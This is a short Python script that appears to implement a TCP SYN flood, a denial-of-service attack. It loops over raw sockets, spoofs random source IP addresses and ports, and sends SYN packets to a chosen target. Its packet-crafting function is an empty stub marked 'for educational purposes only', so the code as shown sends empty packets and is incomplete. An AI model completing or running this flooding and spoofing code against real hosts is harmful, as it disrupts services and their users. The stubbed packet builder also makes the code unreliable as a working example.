import socket
import random

def syn_flood(target_ip, target_port, count):
    try:
        for i in range(count):
            # Create a raw socket
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            
            # Set the IP header manually
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            
            # Randomize source IP and port
            src_ip = ".".join(map(str, (random.randint(1, 254) for _ in range(4))))
            src_port = random.randint(1024, 65535)
            
            # Craft the SYN packet
            packet = craft_syn_packet(src_ip, src_port, target_ip, target_port)
            
            s.sendto(packet, (target_ip, 0))
            
        print(f"Sent {count} SYN packets to {target_ip}:{target_port}")
    except Exception as e:
        print(f"Error: {e}")

def craft_syn_packet(src_ip, src_port, dst_ip, dst_port):
    # This is a simplified version - actual implementation would need proper TCP header construction
    # For educational purposes only
    packet = b''
    # ... (TCP header construction would go here)
    return packet
